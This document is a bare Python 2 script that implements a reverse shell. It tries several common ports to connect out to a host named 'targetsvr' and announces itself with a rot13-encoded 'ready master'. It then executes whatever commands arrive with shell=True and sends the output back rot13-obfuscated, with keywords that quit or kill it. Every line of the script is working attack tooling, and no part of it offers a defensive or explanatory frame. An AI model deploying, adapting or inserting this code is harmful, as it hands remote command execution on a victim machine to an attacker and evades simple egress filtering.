import socket
import time
import subprocess
import sys

connected=False
ports = [21,22,80,443,8000]

while not connected:
	done=False
	mysocket=socket.socket()
	for port in ports:
		time.sleep(1)
		try:
			print "trying port ",port
			mysocket.connect(("targetsvr",port))
		except:
			print "Port ",str(port)," closed! trying next port."
		else:
			mysocket.send("ready master\n".encode("rot13"))
			while not done:
				command = mysocket.recv(2048).decode("rot13")
				print type(command)
				if 'qu1t' in command:
					# print "got here"
					done=True
					mysocket.close()
					break
					#sys.exit()
				if 'k1ll' in command:
					sys.exit()
				prochandle=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				prochandle.wait()
				result = prochandle.stdout.read()+prochandle.stderr.read()
				mysocket.send(result.encode("rot13"))
			#connected=True
			#break